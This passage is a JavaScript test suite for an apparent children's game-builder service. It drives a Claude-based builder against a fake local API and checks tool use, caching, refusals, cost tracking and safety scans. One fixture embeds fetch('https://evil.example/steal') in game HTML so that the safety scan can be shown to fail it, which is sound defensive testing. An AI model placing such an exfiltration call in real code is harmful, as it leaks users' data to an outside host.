// The Claude provider against a local fake Messages API (ANTHROPIC_BASE_URL), so the real agent loop, streaming,
// tool execution, prompt caching blocks, the input classifier and model review run without a real key.
process.env.BRB_DB = ':memory:';
process.env.BRB_SILENT = '1';
process.env.LOG_REQUESTS = '0';
process.env.BRB_DATA_DIR = (await import('node:os')).tmpdir() + '/brb-claude-test-' + process.pid;
import test from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';

const requests = []; const script = [];
const fake = http.createServer((req, res) => {
  let body = ''; req.on('data', c => (body += c)); req.on('end', () => {
    const b = JSON.parse(body || '{}'); requests.push({ url: req.url, headers: req.headers, body: b });
    const sys = JSON.stringify(b.system || '');
    if (!b.stream) {
      const text = sys.includes('You review games') ? '{"verdict":"needs_changes","reasons":["Please change the hero, it looks like a famous character."]}'
        : sys.includes('You check pictures') ? '{"verdict":"allow","reason":"a drawing"}'
        : JSON.stringify(/castle/.test(JSON.stringify(b.messages)) ? { verdict: 'refuse', category: 'copyright' } : { verdict: 'allow', category: 'none' });
      res.setHeader('content-type', 'application/json');
      return res.end(JSON.stringify({ id: 'msg_x', type: 'message', role: 'assistant', model: b.model, content: [{ type: 'text', text }], stop_reason: 'end_turn', stop_sequence: null, usage: { input_tokens: 10, output_tokens: 5 } }));
    }
    // A script entry is a list of blocks, { blocks, stop } (to force a stop_reason such as 'max_tokens'),
    // { blocks, hold: ms } (the stream pauses after the first block's first piece, e.g. so a test can abort), or 'error400'.
    const entry = script.shift() || [{ type: 'text', text: 'Done.' }];
    if (entry === 'error400') { res.writeHead(400, { 'content-type': 'application/json' }); return res.end(JSON.stringify({ type: 'error', error: { type: 'invalid_request_error', message: 'x' } })); }
    const blocks = Array.isArray(entry) ? entry : entry.blocks;
    res.writeHead(200, { 'content-type': 'text/event-stream' });
    const out = []; let closed = false; res.on('close', () => { closed = true; });
    const ev = (name, data) => out.push(`event: ${name}\ndata: ${JSON.stringify({ type: name, ...data })}\n\n`);
    ev('message_start', { message: { id: 'msg_s', type: 'message', role: 'assistant', model: b.model, content: [], stop_reason: null, stop_sequence: null, usage: { input_tokens: 100, output_tokens: 0, cache_read_input_tokens: 50 } } });
    blocks.forEach((blk, i) => {
      if (blk.type === 'text') { ev('content_block_start', { index: i, content_block: { type: 'text', text: '' } }); for (const part of blk.text.match(/.{1,8}/gs)) ev('content_block_delta', { index: i, delta: { type: 'text_delta', text: part } }); }
      // Thinking as current models stream it by default: an empty thinking text, then only a signature.
      else if (blk.type === 'thinking') { ev('content_block_start', { index: i, content_block: { type: 'thinking', thinking: '', signature: '' } }); ev('content_block_delta', { index: i, delta: { type: 'signature_delta', signature: 'sig-fake' } }); }
      else if (blk.type === 'redacted_thinking') ev('content_block_start', { index: i, content_block: { type: 'redacted_thinking', data: 'opaque' } });
      else { ev('content_block_start', { index: i, content_block: { type: 'tool_use', id: `tu_${i}_${requests.length}`, name: blk.name, input: {} } }); const j = JSON.stringify(blk.input); for (let k = 0; k < j.length; k += 500) ev('content_block_delta', { index: i, delta: { type: 'input_json_delta', partial_json: j.slice(k, k + 500) } }); }
      ev('content_block_stop', { index: i });
    });
    ev('message_delta', { delta: { stop_reason: entry.stop || (blocks.some(x => x.type === 'tool_use') ? 'tool_use' : 'end_turn'), stop_sequence: null }, usage: { output_tokens: 42 } });
    ev('message_stop', {});
    if (!entry.hold) { res.end(out.join('')); return; }
    res.write(out.slice(0, 3).join(''));   // message_start, the first block's start and first piece
    setTimeout(() => { if (!closed) res.end(out.slice(3).join('')); }, entry.hold);
  });
});
await new Promise(r => fake.listen(0, r));
process.env.ANTHROPIC_BASE_URL = `http://127.0.0.1:${fake.address().port}`;
test.after(() => fake.close());

const { config } = await import('../../server/config.js');
config.anthropicKey = 'sk-ant-test-fake';
const fsmod = await import('node:fs');
const exe = process.env.BRB_CHROMIUM || ['/opt/pw-browsers/chromium-1194/chrome-linux/chrome', '/opt/pw-browsers/chromium_headless_shell-1194/chrome-linux/headless_shell'].find(f => fsmod.existsSync(f));
const auth = await import('../../server/auth.js');
const games = await import('../../server/services/games.js');
const { runTurn, providerName } = await import('../../server/builder/agent.js');
const { loadChat } = await import('../../server/builder/chat.js');
const { reviewVersion } = await import('../../server/services/review.js');
const { SYSTEM_PROMPT, THREE_D_RULES, asksForLive } = await import('../../server/builder/prompt.js');
const { threeImportMap } = await import('../../server/services/vendor.js');
// Every import before the first test: test.after (which closes the fake API) runs once the tests registered so far
// are done, so a top-level await between tests would close it early when only some tests are picked.
const { TOOLS } = await import('../../server/builder/prompt.js');
const { tEn } = await import('../../server/i18n/index.js');
const runner = await import('../../server/builder/runner.js');
const turns = await import('../../server/builder/turns.js');
const { appendChat } = await import('../../server/builder/chat.js');
const { q, today } = await import('../../server/db.js');

const GAME = '<title>Fox Hop</title><style>body{margin:0}</style><canvas id="c"></canvas><script>const CONFIG = { speed: 1 }; BRB.sfx.play("jump");</script>';

test('Claude provider: streams text, runs tools, makes versions, caches the system prompt and source', async () => {
  assert.equal(providerName(), 'claude');
  const u = auth.createUser({ username: 'ClaudeKid', password: 'secret1' }); const g = games.createGame(u.id, {});
  script.push(
    [{ type: 'text', text: "Here's my plan: a fox that hops over logs. " }, { type: 'tool_use', name: 'set_game', input: { title: 'Fox Hop', icon: '🦊', category: 'arcade', tags: ['fox'] } }, { type: 'tool_use', name: 'write_game', input: { html: GAME, notes: 'First version' } }],
    [{ type: 'tool_use', name: 'edit_game', input: { edits: [{ find: 'speed: 2', replace: 'speed: 3' }], notes: 'oops' } }],
    [{ type: 'tool_use', name: 'edit_game', input: { edits: [{ find: 'speed: 1', replace: 'speed: 2' }], notes: 'Faster fox' } }],
    [{ type: 'tool_use', name: 'test_notes', input: { checklist: ['Hop over a log'] } }, { type: 'tool_use', name: 'ask_user', input: { question: 'What next?', options: ['Make it harder', 'Add a second level', 'Change the hero to a dragon'] } }],
  );
  const events = [];
  const r = await runTurn({ user: u, gameId: g.id, text: 'a fox jumping game', pro: true, emit: (n, d) => events.push([n, d]) });
  assert.equal(r.ok, true, JSON.stringify(events.filter(e => e[0] === 'error')));
  const names = events.map(e => e[0]);
  assert.ok(names.filter(n => n === 'text').length > 3, 'text streamed in pieces');
  assert.deepEqual(events.filter(e => e[0] === 'version').map(e => e[1].number), [1, 2]);
  assert.ok(names.includes('meta') && names.includes('notes') && names.includes('ask'));
  assert.match(games.getVersion(games.getGame(g.id).current_version_id).html, /speed: 2/);

  const calls = requests.filter(x => x.body.stream);
  assert.equal(calls.length, 4);
  const first = calls[0].body;
  assert.equal(first.model, config.builderProModel, 'Pro quality uses the pro model');
  assert.equal(first.system[0].text, SYSTEM_PROMPT); assert.deepEqual(first.system[0].cache_control, { type: 'ephemeral' });
  assert.match(first.system[1].text, /CURRENT GAME: none yet/); assert.deepEqual(first.system[1].cache_control, { type: 'ephemeral' });
  assert.match(calls[1].body.system[1].text, /<current_game>[\s\S]*speed: 1/, 'the new source is passed as its own block');
  assert.ok(first.tools.find(t => t.name === 'write_game').eager_input_streaming);
  assert.equal(first.max_tokens, config.builderMaxTokens); assert.equal(config.builderMaxTokens, 64000);
  assert.match(calls[0].headers['anthropic-beta'] || '', /server-side-fallback-2026-07-01/); assert.equal(first.fallbacks, 'default');
  assert.equal(first.temperature, undefined); assert.equal(first.tool_choice, undefined, 'no forced tool use');
  const failed = calls[2].body.messages.at(-1).content[0];
  assert.equal(failed.type, 'tool_result'); assert.equal(failed.is_error, true); assert.match(failed.content, /not found/, 'edit failures go back to the model');
  assert.ok(requests.some(x => !x.body.stream && /screen messages that children send/.test(JSON.stringify(x.body.system))), 'input classifier ran first');

  const chat = loadChat(g.id);
  assert.doesNotMatch(JSON.stringify(chat.messages), /<script|<canvas/, 'no game source in the transcript');
  const row = (await import('../../server/db.js')).q.get('SELECT tokens_in, tokens_out FROM builder_chats WHERE game_id=?', g.id);
  assert.ok(row.tokens_in >= 600 && row.tokens_out >= 168, 'usage recorded');

  // next turn: history is rebuilt from the transcript as text only
  script.push([{ type: 'text', text: 'Sure!' }]);
  await runTurn({ user: u, gameId: g.id, text: 'thanks', emit: () => {} });
  const last = requests.filter(x => x.body.stream).at(-1).body;
  assert.equal(last.model, config.builderModel);
  assert.equal(last.messages[0].content, 'a fox jumping game');
  assert.match(last.messages[1].content, /Built version 2: Faster fox/);
  assert.doesNotMatch(JSON.stringify(last.messages), /<canvas/);
});

test('3D: the fixed 3D rules block is sent only for 3D, and start_from_template copies Star Island in', async () => {
  const u = auth.createUser({ username: 'ClaudeThreeD', password: 'secret1' }); const g = games.createGame(u.id, {});
  script.push(
    [{ type: 'tool_use', name: 'start_from_template', input: { template: 'island', notes: 'Started a 3D island' } }],
    [{ type: 'tool_use', name: 'edit_game', input: { edits: [{ find: "  sky: 'day',", replace: "  sky: 'night'," }, { find: "  hero: '🐣',", replace: "  hero: '🦊'," }], notes: 'A fox at night' } }],
    [{ type: 'text', text: 'Your 3D island is ready!' }],
  );
  const before = requests.length; const events = [];
  const r = await runTurn({ user: u, gameId: g.id, text: 'make a 3D game with a fox', emit: (n, d) => events.push([n, d]) });
  assert.equal(r.ok, true, JSON.stringify(events.filter(e => e[0] === 'error')));
  const calls = requests.slice(before).filter(x => x.body.stream);
  assert.equal(calls.length, 3);
  const sys = calls[0].body.system;
  assert.equal(sys[0].text, SYSTEM_PROMPT, 'the main prompt is unchanged (cache-friendly)');
  assert.equal(sys[1].text, THREE_D_RULES); assert.deepEqual(sys[1].cache_control, { type: 'ephemeral' });
  assert.match(sys[2].text, /CURRENT GAME: none yet/); assert.match(sys[3].text, /^LANGUAGE:/);
  assert.ok(THREE_D_RULES.includes(threeImportMap()), 'the rules carry the exact pinned import map');
  for (const s of ['start_from_template', 'fit3d', '60 to 75', 'reduced-motion', 'Chromebooks', 'GLTFLoader.parse', 'InstancedMesh', 'webglcontextlost']) assert.ok(THREE_D_RULES.includes(s), s);
  assert.ok(calls[0].body.tools.some(t => t.name === 'start_from_template'));
  // A new 3D world asks "live or closed?"; the live chip keeps "Oomba Live", so picking it sends the live rules next turn.
  assert.match(THREE_D_RULES, /Live or closed world[\s\S]*ask_user[\s\S]*"Oomba Live"[\s\S]*closed world/);
  assert.ok(asksForLive('🌍 Live: others join with Oomba Live'), 'the live chip turns on the live rules');
  assert.ok(!asksForLive('🏝️ Closed: just my world'));
  assert.match(calls[1].body.system[2].text, /<current_game>[\s\S]*type="importmap"/, 'the template is the current game for the next step');
  const v = games.getVersion(games.getGame(g.id).current_version_id);
  assert.equal(v.number, 2); assert.equal(v.safety_status, 'pass', v.safety_report);
  assert.match(v.html, /sky: 'night'/); assert.match(v.html, /hero: '🦊'/); assert.ok(v.html.includes(threeImportMap()));
  // Later turns on a 3D game keep the block; a 2D game never gets it.
  script.push([{ type: 'text', text: 'Sure!' }]);
  await runTurn({ user: u, gameId: g.id, text: 'thanks', emit: () => {} });
  assert.equal(requests.filter(x => x.body.stream).at(-1).body.system[1].text, THREE_D_RULES);
  const g2 = games.createGame(u.id, {});
  script.push([{ type: 'text', text: 'What kind of game?' }]);
  await runTurn({ user: u, gameId: g2.id, text: 'a catching game with apples', emit: () => {} });
  const sys2 = requests.filter(x => x.body.stream).at(-1).body.system;
  assert.equal(sys2.length, 3); assert.ok(!sys2.some(b => b.text === THREE_D_RULES));
});

test('the model classifier can refuse what the word rules miss', async () => {
  const u = auth.createUser({ username: 'ClaudeKid2', password: 'secret1' }); const g = games.createGame(u.id, {});
  const before = requests.filter(x => x.body.stream).length;
  const events = []; const r = await runTurn({ user: u, gameId: g.id, text: 'the castle from that famous princess movie', emit: (n, d) => events.push([n, d]) });
  assert.equal(r.refused, 'copyright'); assert.equal(requests.filter(x => x.body.stream).length, before, 'the Builder model never saw it');
});

test('model review returns a structured verdict; flagged versions still go to a human', async () => {
  const r = await reviewVersion({ title: 'Fox', description: '', tags: '', category: 'arcade' }, { html: GAME, safety_status: 'pass', safety_report: '{}' });
  assert.equal(r.verdict, 'needs_changes'); assert.match(r.reasons[0], /hero/); assert.equal(r.by, config.builderModel);
  const call = requests.at(-1).body; assert.equal(call.output_config.format.type, 'json_schema');
  const blocks = call.messages[0].content; // now a content array (text + any pictures)
  assert.equal(blocks[0].type, 'text'); assert.match(blocks[0].text, /<game>[\s\S]*Fox Hop/);
  assert.match(blocks[0].text, /Code:/, 'a small game is sent in full, not trimmed');
  const f = await reviewVersion({ title: 'Fox' }, { html: GAME, safety_status: 'flag', safety_report: '{}' });
  assert.equal(f.verdict, 'unavailable');
});

test('review attaches game pictures when screenshots are available', { skip: !exe ? 'no Chromium' : false, timeout: 60_000 }, async () => {
  const snapshot = await import('../../server/services/snapshot.js');
  config.snapshots = true; config.chromiumPath = exe;
  try {
    const r = await reviewVersion({ title: 'Fox', description: '', tags: '', category: 'arcade' }, { html: GAME, safety_status: 'pass', safety_report: '{}' });
    assert.equal(r.verdict, 'needs_changes');
    const blocks = requests.at(-1).body.messages[0].content;
    const imgs = blocks.filter(b => b.type === 'image');
    assert.ok(imgs.length >= 1, 'at least the title screen was attached');
    assert.equal(imgs[0].source.type, 'base64'); assert.equal(imgs[0].source.media_type, 'image/jpeg');
    assert.match(blocks[0].text, /Pictures: \d+ attached/);
  } finally { config.snapshots = false; config.chromiumPath = ''; await snapshot.closeBrowser(); }
});

// ---- Live build steps (steps.js) with the Claude provider ----------------------------------------------------
/** step + stepinfo events -> one object per row (without i), in row order. */
const rowsOf = events => { const rows = []; for (const [n, d] of events) { if (n === 'step') rows[d.i - 1] = { ...d }; else if (n === 'stepinfo') Object.assign(rows[d.i - 1], d); } return rows.map(({ i, ...r }) => r); };
const recRows = rec => rec.s.map(([key, , f]) => ({ key, ...(f || {}) }));
const idx = (events, name, pred = () => true) => events.findIndex(([n, d]) => n === name && pred(d));
// 100 lines, about 3 KB, so the input streams in several 500-byte pieces.
const BIG = ['<title>Fox Hop</title><style>body{margin:0}</style><canvas id="c"></canvas><script>', 'const CONFIG = { speed: 1, size: 2 };',
  ...Array.from({ length: 97 }, (_, k) => `// ${k + 1}: the fox hops over logs`), 'BRB.sfx.play("jump");</script>'].join('\n');
async function stepTurn(u, g, text, rounds) {
  script.push(...rounds);
  const events = []; const r = await runTurn({ user: u, gameId: g.id, text, emit: (n, d) => events.push([n, d]) });
  assert.equal(script.length, 0, 'every scripted round was used');
  return { r, events, rows: rowsOf(events), done: events.find(e => e[0] === 'done')[1] };
}

test('a round that runs out of room while planning: one retry that thinks less, then a clear error and the turn back', async () => {
  const u = auth.createUser({ username: 'CutKid1', password: 'secret1' }); const g = games.createGame(u.id, {});
  // Once: the next round is asked to write now, with less thinking, and builds.
  let from = requests.length;
  const ok = await stepTurn(u, g, 'a huge stadium game', [
    { blocks: [{ type: 'thinking' }], stop: 'max_tokens' },
    [{ type: 'tool_use', name: 'write_game', input: { notes: 'Stadium', html: BIG } }],
    [{ type: 'text', text: 'Done!' }],
  ]);
  assert.equal(ok.r.ok, true);
  const sent = requests.slice(from).filter(r => r.body.stream).map(r => r.body);
  assert.equal(sent[0].max_tokens, 64000);
  assert.equal(sent[1].output_config.effort, 'low', 'the retry thinks less');
  assert.match(JSON.stringify(sent[1].messages.at(-1)), /ran out of room/);
  assert.ok(ok.rows.some(x => x.key === 'write'));
  // Twice: no silent empty reply. An error says so, and the turn is given back.
  const before = ok.done.turnsLeft;
  from = requests.length;
  const bad = await stepTurn(u, g, 'an even bigger game', [
    { blocks: [{ type: 'thinking' }], stop: 'max_tokens' },
    { blocks: [{ type: 'thinking' }], stop: 'max_tokens' },
  ]);
  assert.equal(bad.r.ok, false);
  assert.ok(bad.events.some(([n, d]) => n === 'error' && /ran out of room before it could build anything/.test(d.message)));
  assert.equal(bad.done.turnsLeft, before, 'the turn was given back');
});

test('cost per message: each build stores what its own model calls cost, who paid and its weight; Pro weight and refunds', async () => {
  const aiBudget = await import('../../server/services/ai-budget.js');
  const usage = await import('../../server/builder/usage.js');
  const u = auth.createUser({ username: 'CostKid', password: 'secret1' }); const g = games.createGame(u.id, {});
  const pool0 = (q.get("SELECT usd FROM ai_spend_pool WHERE day=? AND pool='free'", today()) || { usd: 0 }).usd;
  const from = requests.length;
  script.push([{ type: 'tool_use', name: 'write_game', input: { notes: 'Fox', html: GAME } }], [{ type: 'text', text: 'Done!' }]);
  const r = await runTurn({ user: u, gameId: g.id, text: 'a fox game', emit: () => {} });
  assert.equal(r.ok, true);
  const calls = requests.slice(from).filter(x => x.body.stream).length;
  assert.equal(calls, 2);
  // The fake API answers every streamed call with 100 input, 50 cached and 42 output tokens.
  const each = aiBudget.costOf(config.builderModel, { input_tokens: 100, cache_read_input_tokens: 50, output_tokens: 42 });
  const row = q.get("SELECT usd, usd_known, charged_to, weight FROM builder_turns WHERE game_id=? AND charged_day IS NOT NULL", g.id);
  assert.ok(Math.abs(row.usd - calls * each) < 1e-9, `${row.usd} vs ${calls * each}`);
  assert.equal(row.usd_known, 1); assert.equal(row.charged_to, 'free'); assert.equal(row.weight, 1);
  const pool1 = q.get("SELECT usd FROM ai_spend_pool WHERE day=? AND pool='free'", today()).usd;
  assert.ok(pool1 - pool0 >= row.usd - 1e-9, 'the free pool paid for it (plus screening)');
  const { source, pool, daily, proWeight, familyId } = usage.allowanceFor(u);
  assert.deepEqual({ source, pool, daily, proWeight, familyId }, { source: 'free', pool: 'free', daily: config.builderDailyTurns, proWeight: 1, familyId: null });

  // PRO_TURN_WEIGHT=2: a Pro message uses two turns, and a refund gives both back.
  const saved = config.proTurnWeight; config.proTurnWeight = 2;
  try {
    const left0 = usage.turnsLeft(u);
    script.push([{ type: 'text', text: 'Done.' }]);
    await runTurn({ user: u, gameId: g.id, text: 'make it pro', pro: true, emit: () => {} });
    assert.equal(usage.turnsLeft(u), left0 - 2);
    const pro = q.get("SELECT id, weight FROM builder_turns WHERE game_id=? AND pro=1", g.id);
    assert.equal(pro.weight, 2);
    assert.equal(turns.refund(pro.id), true); assert.equal(usage.turnsLeft(u), left0);
    assert.equal(turns.refund(pro.id), false, 'once only'); assert.equal(usage.turnsLeft(u), left0);
  } finally { config.proTurnWeight = saved; }
});

test('tool schema: notes comes first in write_game and edit_game, and both fields are required', () => {
  for (const [name, other] of [['write_game', 'html'], ['edit_game', 'edits']]) {
    const tool = TOOLS.find(t => t.name === name);
    assert.deepEqual(Object.keys(tool.input_schema.properties), ['notes', other], name);
    assert.deepEqual(tool.input_schema.required, ['notes', other]);
    assert.match(tool.description, new RegExp(`Write notes first, then ${other}\\.`));
    assert.match(tool.input_schema.properties.notes.description, new RegExp(`^Write this FIRST, before ${other}:`));
  }
  assert.match(SYSTEM_PROMPT, /write_game\(notes, html\)/); assert.match(SYSTEM_PROMPT, /edit_game\(notes, edits\)/);
  assert.match(SYSTEM_PROMPT, /notes comes first/);
});

test('build steps: rounds, a real thinking block, the AI\'s plan streamed first, live counters, failures on their own row', async () => {
  assert.equal(BIG.split('\n').length, 100); assert.ok(BIG.length > 2500);
  const u = auth.createUser({ username: 'StepsKid', password: 'secret1' }); const g = games.createGame(u.id, {});
  const before = requests.filter(x => x.body.stream).length;
  const { r, events, rows, done } = await stepTurn(u, g, 'a fox jumping game', [
    [{ type: 'thinking' }, { type: 'text', text: "Here's my plan: a fox that hops over logs. " }, { type: 'tool_use', name: 'set_game', input: { title: 'Fox Hop', icon: '🦊', category: 'arcade' } }, { type: 'tool_use', name: 'write_game', input: { notes: 'First version', html: BIG } }],
    [{ type: 'tool_use', name: 'edit_game', input: { notes: 'Oops', edits: [{ find: 'speed: 9', replace: 'speed: 3' }] } }],
    [{ type: 'tool_use', name: 'edit_game', input: { notes: 'Faster and bigger fox', edits: [{ find: 'speed: 1', replace: 'speed: 2' }, { find: 'size: 2', replace: 'size: 3' }] } }],
    [{ type: 'tool_use', name: 'test_notes', input: { checklist: ['Hop over a log'] } }, { type: 'tool_use', name: 'ask_user', input: { question: 'What next?', options: ['Make it harder', 'Add a level'] } }],
  ]);
  assert.equal(r.ok, true, JSON.stringify(events.filter(e => e[0] === 'error')));
  assert.deepEqual(rows.map(x => x.key), ['screen', 'think', 'write', 'name', 'check', 'think', 'edit', 'think', 'edit', 'check', 'think', 'notes', 'ask']);
  assert.deepEqual(rows[0], { key: 'screen' });
  assert.deepEqual(rows[1], { key: 'think', n: 1, c: 'start', a: 1, th: 1 }, 'round 1: first message, a thinking block really streamed, no game yet');
  assert.deepEqual(rows[2], { key: 'write', plan: 'First version', l: 100 });
  assert.deepEqual(rows[3], { key: 'name', title: 'Fox Hop', icon: '🦊' }, 'set_game runs first (block order), after the write row started');
  assert.equal(rows[4].key, 'check'); assert.equal(rows[4].v, 1); assert.ok(['pass', 'flag'].includes(rows[4].st), rows[4].st);
  assert.deepEqual(rows[5], { key: 'think', n: 2, c: 'next', a: 1 }, 'no thinking block: no th');
  assert.deepEqual(rows[6], { key: 'edit', plan: 'Oops', e: 1, ok: false }, 'the failed edit is marked');
  assert.deepEqual(rows[7], { key: 'think', n: 3, c: 'retry', a: 1 });
  assert.deepEqual(rows[8], { key: 'edit', plan: 'Faster and bigger fox', e: 2 });
  assert.equal(rows[9].key, 'check'); assert.equal(rows[9].v, 2);
  assert.deepEqual(rows[10], { key: 'think', n: 4, c: 'next', a: 1 });
  // The plan streamed before the code finished (notes first), and the lines counter ended exact.
  const infos = events.map((e, k) => [k, e[0], e[1]]).filter(([, n, d]) => n === 'stepinfo' && d.i === 3);
  const plan = infos.find(([, , d]) => d.plan); const lastL = infos.filter(([, , d]) => 'l' in d).at(-1);
  assert.ok(plan[0] < lastL[0], 'the plan stepinfo came before the last lines stepinfo');
  assert.ok(!('l' in plan[2]) || plan[2].l < 100, 'the code was still streaming when the plan arrived');
  assert.equal(lastL[2].l, 100);
  // Each row comes before its card; a failure marks its own row (i = 7), not the newest.
  assert.ok(idx(events, 'step', s => s.key === 'write') < idx(events, 'step', s => s.key === 'name'));
  assert.ok(idx(events, 'step', s => s.key === 'name') < idx(events, 'meta') && idx(events, 'meta') < idx(events, 'step', s => s.key === 'check'));
  assert.ok(idx(events, 'step', s => s.key === 'check') < idx(events, 'version'));
  assert.deepEqual(events.filter(e => e[0] === 'stepinfo' && e[1].ok === false).map(e => e[1].i), [7]);
  assert.equal(idx(events, 'progress'), -1, 'the old progress event is gone');
  // The record: same rows, AI mode, rounds and tokens; stored last in the transcript.
  assert.equal(done.steps.p, 'ai'); assert.equal(done.steps.r, 4); assert.equal(done.steps.end, 'ok');
  assert.ok(done.steps.ti >= 600 && done.steps.to >= 168, 'tokens read and written');
  assert.deepEqual(recRows(done.steps), rows);
  assert.deepEqual(loadChat(g.id).messages.at(-1).events.at(-1), ['steps', done.steps]);
  // The request itself was not changed to get thinking.
  for (const c of requests.filter(x => x.body.stream).slice(before)) { assert.equal(c.body.thinking, undefined); assert.equal(c.body.temperature, undefined); }
  // Next turn: round 1 also reads the game (g), and the model never sees the steps record.
  const next = await stepTurn(u, g, 'thanks', [[{ type: 'text', text: 'Sure!' }]]);
  assert.deepEqual(next.rows, [{ key: 'screen' }, { key: 'think', n: 1, c: 'start', a: 1, g: 1 }]);
  const sent = JSON.stringify(requests.filter(x => x.body.stream).at(-1).body.messages);
  assert.match(sent, /Built version 2: Faster and bigger fox/);
  assert.doesNotMatch(sent, /"steps"|"th":|\["screen"|"plan"/);
});

test('build steps: notes after html still give the plan; long notes come from the real input; a playtest without screenshots says it could not run; a cut-off call is marked', async () => {
  const u = auth.createUser({ username: 'StepsKid2', password: 'secret1' }); const g = games.createGame(u.id, {});
  const { events, rows, done } = await stepTurn(u, g, 'a fox game', [
    [{ type: 'tool_use', name: 'write_game', input: { html: BIG, notes: 'Old order notes' } }],
    [{ type: 'tool_use', name: 'edit_game', input: { notes: '  Z' + 'z'.repeat(4999), edits: [{ find: 'speed: 1', replace: 'speed: 2' }] } }],
    [{ type: 'tool_use', name: 'playtest_game', input: {} }],
    { blocks: [{ type: 'tool_use', name: 'write_game', input: { notes: 'Too long', html: BIG } }], stop: 'max_tokens' },
    [{ type: 'redacted_thinking' }, { type: 'text', text: 'I will make it shorter.' }],
  ]);
  assert.deepEqual(rows.map(x => x.key), ['screen', 'think', 'write', 'check', 'think', 'edit', 'check', 'think', 'playtest', 'think', 'write', 'think']);
  assert.deepEqual(rows[2], { key: 'write', l: 100, plan: 'Old order notes' }, 'old key order: the plan arrives at the end');
  assert.deepEqual(rows[5], { key: 'edit', e: 1, plan: 'Z' + 'z'.repeat(119) }, 'notes too long to stream: the plan is the real notes, cleaned and capped');
  assert.ok(idx(events, 'stepinfo', d => d.i === 6 && d.plan) > idx(events, 'step', s => s.key === 'check' && s.v === 2), 'set after the tool ran');
  assert.deepEqual(rows[7], { key: 'think', n: 3, c: 'next', a: 1 });
  // Playtesting is off in unit tests: the AI asked for one, so the row is there, marked as not run (never as a test).
  assert.deepEqual(rows[8], { key: 'playtest', v: 2, ok: false }, 'an attempted playtest says it could not run');
  assert.equal(idx(events, 'playtest'), -1, 'no playtest card: nothing was tested');
  assert.deepEqual(rows[9], { key: 'think', n: 4, c: 'retry', a: 1 }, 'the next round reads that error, and the card shows it');
  assert.deepEqual(rows[10], { key: 'write', plan: 'Too long', l: 100, ok: false, why: 'cut' });
  assert.deepEqual(rows[11], { key: 'think', n: 5, c: 'retry', a: 1, th: 1 }, 'redacted thinking counts as thinking too');
  assert.equal(done.steps.end, 'ok'); assert.equal(done.steps.r, 5);
});

test('build steps: a failed safety scan gives "reading the safety report" rounds and exactly two fix rows', async () => {
  const u = auth.createUser({ username: 'StepsKid3', password: 'secret1' }); const g = games.createGame(u.id, {});
  const BAD = '<title>x</title><style>b{}</style><canvas></canvas><script>fetch("https://evil.example/steal")</script>';
  const { events, rows } = await stepTurn(u, g, 'a fox game', [1, 2, 3].map(k => [{ type: 'tool_use', name: 'write_game', input: { notes: `Try ${k}`, html: BAD } }]));
  // k = the must-fix problems the version card lists, so the row and the card never disagree.
  const k = events.find(e => e[0] === 'version')[1].issues.filter(x => x.startsWith('Must fix')).length;
  assert.ok(k >= 1);
  assert.deepEqual(rows, [
    { key: 'screen' }, { key: 'think', n: 1, c: 'start', a: 1 }, { key: 'write', plan: 'Try 1', l: 1 }, { key: 'check', st: 'fail', v: 1, k },
    { key: 'think', n: 2, c: 'scan', a: 1 }, { key: 'fix', via: 'write', plan: 'Try 2', l: 1 }, { key: 'check', st: 'fail', v: 2, k },
    { key: 'think', n: 3, c: 'scan', a: 1 }, { key: 'fix', via: 'write', plan: 'Try 3', l: 1 }, { key: 'check', st: 'fail', v: 3, k },
  ]);
  assert.ok(events.filter(e => e[0] === 'text').map(e => e[1].text).join('').includes(tEn('builder.scanStillFailing')));
});

test('build steps: a tool that failed without a row of its own leads to "what\'s next"; a flagged scan counts what it listed', async () => {
  const u = auth.createUser({ username: 'StepsKid7', password: 'secret1' }); const g = games.createGame(u.id, {});
  // Two scripts from libraries nobody reviewed: two flag issues on one version.
  const FLAGGED = BIG.replace('<script>', '<script src="https://cdnjs.cloudflare.com/ajax/libs/nope/1.0/a.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/nope/1.0/b.js"></script><script>');
  const { rows, events } = await stepTurn(u, g, 'a fox game', [
    [{ type: 'tool_use', name: 'set_game', input: { category: 'not-a-category' } }],
    [{ type: 'tool_use', name: 'write_game', input: { notes: 'Fox with helpers', html: FLAGGED } }],
    [{ type: 'text', text: 'Done!' }],
  ]);
  assert.deepEqual(rows.map(x => x.key), ['screen', 'think', 'think', 'write', 'check', 'think']);
  assert.deepEqual(rows[2], { key: 'think', n: 2, c: 'next', a: 1 }, 'set_game changed nothing and has no row: no "went wrong" round');
  const v = events.find(e => e[0] === 'version')[1];
  assert.equal(v.status, 'flag'); assert.equal(rows[4].st, 'flag');
  assert.equal(rows[4].k, v.issues.length, 'the check row counts the same issues the version card lists');
  assert.ok(rows[4].k >= 2, `issues: ${rows[4].k}`);
});

test('build steps: a provider error stops the card with end "error"', async () => {
  const u = auth.createUser({ username: 'StepsKid4', password: 'secret1' }); const g = games.createGame(u.id, {});
  const { r, events, rows, done } = await stepTurn(u, g, 'a fox game', ['error400']);
  assert.equal(r.ok, false);
  assert.equal(events.find(e => e[0] === 'error')[1].message, tEn('builder.errors.muddled'));
  assert.deepEqual(rows, [{ key: 'screen' }, { key: 'think', n: 1, c: 'start' }]);
  assert.equal(done.steps.end, 'error'); assert.equal(done.steps.r, 1);
  assert.deepEqual(loadChat(g.id).messages.at(-1).events.at(-1), ['steps', done.steps]);
});

test('build steps: a real playtest with problems gives "looking at the pictures", then a fix row', { skip: !exe ? 'no Chromium' : false, timeout: 90_000 }, async () => {
  const snapshot = await import('../../server/services/snapshot.js');
  config.snapshots = true; config.chromiumPath = exe;
  try {
    const u = auth.createUser({ username: 'StepsKid5', password: 'secret1' }); const g = games.createGame(u.id, {});
    const { events, rows } = await stepTurn(u, g, 'a fox game', [
      [{ type: 'tool_use', name: 'write_game', input: { notes: 'First version', html: GAME } }],
      [{ type: 'tool_use', name: 'playtest_game', input: {} }],
      [{ type: 'tool_use', name: 'edit_game', input: { notes: 'Faster fox', edits: [{ find: 'speed: 1', replace: 'speed: 2' }] } }],
      [{ type: 'text', text: 'Looks good now!' }],
    ]);
    assert.deepEqual(rows.map(x => x.key), ['screen', 'think', 'write', 'check', 'think', 'playtest', 'think', 'fix', 'check', 'think']);
    const pt = rows[5];
    assert.equal(pt.v, 1); assert.ok(pt.pics >= 1 && pt.pics <= 2, `pictures: ${pt.pics}`); assert.ok(pt.probs >= 1, 'the missing __brbTest hook is a problem');
    assert.equal(pt.probs, events.find(e => e[0] === 'playtest')[1].problems, 'the same count as the playtest card');
    assert.ok(idx(events, 'step', s => s.key === 'playtest') < idx(events, 'playtest'));
